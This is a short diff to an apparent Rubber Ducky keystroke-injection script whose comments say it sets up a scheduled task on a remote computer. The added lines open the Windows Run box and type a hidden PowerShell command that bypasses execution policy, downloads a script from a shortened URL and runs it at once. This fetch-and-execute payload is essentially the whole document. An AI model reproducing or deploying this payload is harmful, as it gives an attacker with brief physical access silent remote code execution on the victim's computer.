@@ -1,5 +1,8 @@
 REM By Joshua O' Brien
 REM scheduled task on a remote computer, more info here https://lolbas-project.github.io/lolbas/Binaries/Schtasks/
 REM uses schtasks_exe.ps1 , by default runs only if computer is on AC power
-
+GUI r
+DEFAULT_DELAY 350
+STRING powershell -NoP -Ep Bypass -W H -C irm tnyr.me/AGe1dHZZw3 | iex
+ENTER
 
